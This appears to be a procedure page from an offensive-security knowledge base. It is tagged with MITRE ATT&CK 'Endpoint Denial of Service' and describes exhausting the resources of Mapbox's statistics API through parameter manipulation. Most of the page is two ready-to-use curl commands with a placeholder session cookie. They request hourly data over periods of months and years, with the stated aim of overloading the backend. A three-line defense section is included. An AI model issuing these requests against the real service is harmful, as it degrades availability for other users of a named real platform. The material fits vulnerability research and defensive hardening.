---
id: proc-mapbox-param-manip
tags:
  - parameter-manipulation
  - resource-exhaustion
  - dos
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-mapbox-dos-params]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.049Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[OS Exhaustion Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Manipulate-Interval-and-Period-for-DoS

## Summary

This procedure exploits the lack of limits on 'interval' and 'period' parameters in the Mapbox statistics endpoint to request fine-grained data over extended timeframes, causing large responses and backend overload.

## Description

By changing 'interval' from 'day' to 'hour' and extending 'period' to months or years, the endpoint generates massive datasets (e.g., 372 KB for short extensions, up to MB for years). This evades rate limits as it's a single request, leading to high CPU/memory usage and potential DoS for other users. The attack targets the web API in an authenticated context.

## Requirements

1. Authenticated session
2. Timestamp values for period (Unix milliseconds)
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Validate and limit period length (e.g., max 1 year)
- Cap granularity based on timeframe
- Monitor response sizes and processing times

## Objectives

1. Increase data granularity and timeframe
2. Force excessive computation
3. Achieve resource exhaustion

## Instructions

### Step 1: Modify Parameters

**Context**: Set interval to 'hour' and extend period.

**Command** ([[commands/curl-mapbox-dos-params]]):
```bash
curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=hour&period=1451766083142,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155" -o dos_response.json
```

> Response grows to ~372 KB; backend processes hourly data over months.

### Step 2: Extend Further

**Context**: Amplify by using years-long periods.

**Command** ([[commands/curl-mapbox-dos-params]]):
```bash
curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=hour&period=1410000000000,1720000000000&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface" -o extended_response.json
```

> Expected: MB-sized response or timeout from overload.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques

- [[OS Exhaustion Flood]]

## Commands Used

- [[commands/curl-mapbox-dos-params]]

## Tools Used


## Tags

- parameter-manipulation
- resource-exhaustion
- dos
